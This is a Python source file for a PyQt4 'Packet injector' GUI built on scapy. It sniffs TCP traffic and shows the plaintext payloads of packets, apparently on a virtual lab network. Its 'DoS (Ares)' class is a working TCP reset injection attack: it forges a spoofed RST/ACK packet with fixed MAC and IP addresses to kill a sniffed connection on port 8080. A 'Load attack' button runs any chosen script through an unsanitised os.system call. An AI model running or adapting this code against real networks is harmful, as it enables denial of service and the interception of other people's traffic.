#!/bin/python

import sys
from PyQt4.QtCore import pyqtSlot, SIGNAL,SLOT, pyqtSignal
from PyQt4.QtCore import QTime, QThread
from PyQt4.QtGui import *
from scapy.all import *
import sys
import os

from scapy.all import *

# TCP Flags and their hex code
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

class DoS(QThread):
    def __init__(self):
        QThread.__init__(self)
        self.textBox = None

    def __del__(self):
        self.wait()

    def setTextBox(self, textBox):
        self.textBox = textBox

    def inj(self, pacote, pkt):
        pacote[TCP].dport = pkt[TCP].sport
        pacote[TCP].ack = pkt[TCP].seq + 1
        del pacote[IP].chksum
        del pacote[TCP].chksum
        #pacote.show2()
        #for i in range(0, 15):
        sendp(pacote, iface="virbr0")
        self.textBox.appendText("\nDoS done")


    def attack_dos(self):
        pacote = Ether()/IP()/TCP()

        # Ether
        pacote[Ether].dst = "52:54:00:d4:c2:37"
        pacote[Ether].src = "52:54:00:f4:4a:bc"

        # IP
        pacote[IP].ihl = 5
        pacote[IP].id = 1298
        pacote[IP].flags="DF"
        pacote[IP].src = "192.168.122.95"
        pacote[IP].dst = "192.168.122.142"
        pacote[IP].len = 40
        #pacote[IP].chksum =  0x7d9e


        # TCP
        pacote[TCP].sport = 8080
        pacote[TCP].seq = 0
        pacote[TCP].dataofs=5
        pacote[TCP].flags="RA"
        pacote[TCP].window=0
        #pacote[TCP].chksum=0x274a
        pacote[TCP].options={}

        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 1, prn=lambda x: self.inj(pacote, x))

    def run(self):
        self.attack_dos()

class Sniffer(QThread):

    def __init__(self):
        QThread.__init__(self)
        self.i = 0
        self.table = None
        self.filter = "tcp"
        self.restart = False

    def __del__(self):
        self.wait()

    def setTable(self, table):
        self.table = table

    def setFilter(self, filter_arg):
        self.filter = filter_arg

    def setRestart(self):
        self.restart = True

    def getFlags(self, F):
        f = []
        if F & FIN:
            f.append('FIN')
        if F & SYN:
            f.append('SYN')
        if F & RST:
            f.append('RST')
        if F & PSH:
            f.append('PSH')
        if F & ACK:
            f.append('ACK')
        if F & URG:
            f.append('URG')
        if F & ECE:
            f.append('ECE')
        if F & CWR:
            f.append('CWR')
        return f

    def capture(self):
        s = sniff(filter=self.filter, prn=lambda packet: self.unpack(packet))

    def unpack(self, packet):
        try:
            src = packet[IP].src
            dst = packet[IP].dst
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            flags = self.getFlags(flags)
            if 'PSH' in flags:
                if sport == 443 or dport == 443 or sport == 22 or dport == 22:
                    raw = "Encrypted payload (" + str(sys.getsizeof(packet[Raw].load)) + " bytes)"
                else:
                    raw = "Payload: " + str(packet[Raw].load)
            else:
                raw = ""
            self.updateTable(src, dst, str(sport), str(dport), str(flags), raw)
        except:
            print("Error in unpack")

        if self.restart:
            self.restart = False
            self.terminate()

    def updateTable(self, src, dst, sport, dport, flags, raw):
        self.table.setItem(self.i,0, QTableWidgetItem(src))
        self.table.setItem(self.i,1, QTableWidgetItem(dst))
        self.table.setItem(self.i,2, QTableWidgetItem(sport))
        self.table.setItem(self.i,3, QTableWidgetItem(dport))
        self.table.setItem(self.i,4, QTableWidgetItem(str(flags)))
        self.table.setItem(self.i,5, QTableWidgetItem(raw))
        self.i += 1

    def run(self):
        self.capture()

class customAttack(QThread):
    def __init__(self):
        QThread.__init__(self)
        self.attack_file = None

    def __del__(self):
        self.wait()


    def getFile(self, window):
        self.attack_file = QFileDialog.getOpenFileName(window, 'Open file',
            'c:\\',"Scapy script (*.py)")

    def run(self):
        os.system('python2 ' + self.attack_file)

class TextBox(QPlainTextEdit):
    def __init__(self, text=""):
        super(TextBox, self).__init__()
        self.text = text

    def setText(self, text):
        self.text = text

    def appendText(self, text):
        self.text +=  text

    def getText(self):
        return self.text

    def updateText(self):
        print("updateText")
        self.setPlainText(self.text)

class MainWindow(QWidget):
    def __init__(self):
        super(MainWindow, self).__init__()

    def updateUi(self):
        print('sdasd')

if __name__ == "__main__":

    # create our window
    app = QApplication(sys.argv)
    w = MainWindow()
    w.setWindowTitle('Packet injector')
    w.resize(700, 900)

    # set layout
    grid = QGridLayout()
    grid.setSpacing(10)
    w.setLayout(grid)

    # set title label
    title_label = QLabel('Packet injector                 Filter (BPF syntax):')
    grid.addWidget(title_label, 0, 0)

    # set filter text box
    filter_textbox = QLineEdit()
    grid.addWidget(filter_textbox, 0, 1)

    # set filter button
    btn_filter = QPushButton("Apply")
    grid.addWidget(btn_filter, 0, 2)
    @pyqtSlot()
    def on_click():
        f = filter_textbox.text()
        if len(f) > 0:
            global sniffer
            sniffer.setRestart()
            sniffer = Sniffer()
            sniffer.setTable(table)
            sniffer.setFilter("tcp and " + f)
            sniffer.start()

    btn_filter.clicked.connect(on_click)


    # prepare table
    table 	= QTableWidget()
    tableItem 	= QTableWidgetItem()
    table.setRowCount(1000)
    table.setColumnCount(6)
    table.setHorizontalHeaderLabels(("IP src; IP dst; Port src; Port dst; Flags; Raw").split(";"))
    grid.addWidget(table, 1, 0, 1, 3)

    # start sniffing
    sniffer = Sniffer()
    sniffer.setTable(table)
    sniffer.start()

    # prepare "Attack" label
    attack_label = QLabel('Attacks')
    grid.addWidget(attack_label, 2, 0)

    # create DoS button
    btn_dos = QPushButton('DoS (Ares)')
    dos = DoS()
    @pyqtSlot()
    def on_click():
        text_log.appendText("DoS starting...")
        text_log.updateText()
        dos.start()

    grid.addWidget(btn_dos, 3, 0)
    btn_dos.clicked.connect(on_click)


    # create Load attack button
    custom_attack = customAttack()
    btn_load = QPushButton('Load attack')
    @pyqtSlot()
    def on_click():
        custom_attack.getFile(w)
        load_label.setText(custom_attack.attack_file)
        btn_attack.setEnabled(True)

    grid.addWidget(btn_load, 4, 0)
    btn_load.clicked.connect(on_click)

    # prepare "Load" label
    load_label = QLabel('Nothing loaded')
    grid.addWidget(load_label, 4, 1)

    # create Load attack button
    btn_attack = QPushButton('Attack!')
    btn_attack.setEnabled(False)
    @pyqtSlot()
    def on_click():
        custom_attack.start()

    grid.addWidget(btn_attack, 4, 2)
    btn_attack.clicked.connect(on_click)

    # system log
    log_label = QLabel('System log:')
    grid.addWidget(log_label, 5, 0)
    text_log = TextBox()
    text_log.setEnabled(False)
    grid.addWidget(text_log, 6, 0)
    w.connect(dos, SIGNAL("finished()"), text_log.updateText)

    # original payload
    original_label = QLabel('Original payload:')
    grid.addWidget(original_label, 5, 1)
    text_original = TextBox()
    text_original.setEnabled(False)
    grid.addWidget(text_original, 6, 1)

    # new payload
    new_label = QLabel('New payload:')
    grid.addWidget(new_label, 5, 2)
    text_new = QPlainTextEdit()
    text_new.setReadOnly(True)
    grid.addWidget(text_new, 6, 2)

    dos.setTextBox(text_log)

    # Show the window and run the app
    w.show()
    app.exec_()
